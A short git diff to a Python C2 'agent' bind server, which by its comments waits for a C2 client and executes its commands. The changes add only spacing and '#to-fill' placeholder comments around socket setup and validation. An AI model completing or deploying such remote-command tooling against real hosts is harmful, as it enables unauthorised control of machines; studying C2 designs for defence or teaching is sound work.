@@ -5,11 +5,9 @@ import argparse
 import os
 import uuid
 
+
 # The agent's server is a bind TCP connection server.
 # It will wait for a C2 client to connect to it and execute its commands
-
-
-
 
 
 
@@ -48,12 +46,17 @@ class ThreadedServer:
         self.agent_uuid = generate_agent_uuid()
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+        # todo: #to-fill
         validator.validate_ip(src_ip)
         self.src_ip = src_ip
         validator.validate_port(src_port)
         self.src_port = src_port
+        # todo: #to-fill
+
         self.client_handlers = []
 
+    # todo: #to-fill
     def start(self):
         print(f"[+] Trying to bind {self.src_ip}:{self.src_port}")
         self.server_socket.bind((self.src_ip, self.src_port))
@@ -69,6 +72,7 @@ class ThreadedServer:
         except KeyboardInterrupt:
             print("\nServer shutting down.")
             self.stop()
+    # todo: #to-fill
 
     def stop(self):
         """
